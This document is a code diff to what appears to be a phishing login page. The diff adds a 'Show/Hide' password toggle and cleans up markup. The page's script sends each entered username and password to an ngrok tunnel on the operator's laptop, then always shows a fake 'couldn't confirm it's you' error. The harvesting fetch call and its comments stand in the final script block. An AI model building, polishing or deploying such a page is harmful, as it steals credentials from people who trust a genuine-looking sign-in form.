@@ -50,14 +50,19 @@
       </div>
 
       <form id="login-form">
-        <div class="mb-2">
+        <div class="mb-2 relative">
           <div class="text-sm text-gray-500 mb-1">Password</div>
-          <input 
-            id="password-input"
-            type="password" 
-            class="w-full border border-gray-300 rounded-2xl px-5 py-4 focus:outline-none focus:border-blue-500 text-lg"
-            placeholder="Enter password"
-            required>
+          <div class="relative">
+            <input 
+              id="password-input"
+              type="password" 
+              class="w-full border border-gray-300 rounded-2xl px-5 py-4 focus:outline-none focus:border-blue-500 text-lg pr-14"
+              placeholder="Enter password"
+              required>
+            <button type="button" onclick="togglePassword()" class="absolute right-5 top-1/2 -translate-y-1/2 text-blue-500 font-semibold text-sm hover:text-blue-700">
+              Show
+            </button>
+          </div>
         </div>
 
         <button 
@@ -81,10 +86,7 @@
           We couldn't confirm it's you right now.<br>
           Please try again later.
         </p>
-
-        <button 
-          onclick="resetDemo()"
-          class="mt-10 w-full bg-gray-100 hover:bg-gray-200 py-4 rounded-2xl font-semibold text-lg">
+        <button onclick="resetDemo()" class="mt-10 w-full bg-gray-100 hover:bg-gray-200 py-4 rounded-2xl font-semibold text-lg">
           Try again
         </button>
       </div>
@@ -92,6 +94,20 @@
   </div>
 
   <script>
+    // TOGGLE PASSWORD VISIBILITY
+    function togglePassword() {
+      const passwordInput = document.getElementById('password-input');
+      const toggleBtn = event.currentTarget;
+      
+      if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+        toggleBtn.textContent = 'Hide';
+      } else {
+        passwordInput.type = 'password';
+        toggleBtn.textContent = 'Show';
+      }
+    }
+
     const form = document.getElementById('login-form');
     const formScreen = document.getElementById('form-screen');
     const errorScreen = document.getElementById('error-screen');
@@ -106,13 +122,13 @@
       btn.innerHTML = 'Checking...';
       btn.disabled = true;
 
-      // This part sends the data to your laptop via Ngrok
+      // Ensure this URL matches your active Ngrok tunnel link!
       fetch('https://belia-puristical-sophia.ngrok-free.dev/login', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ username: username, password: password })
       })
-      .then(response => {
+      .then(() => {
         setTimeout(() => {
           formScreen.classList.add('hidden');
           errorScreen.classList.remove('hidden');
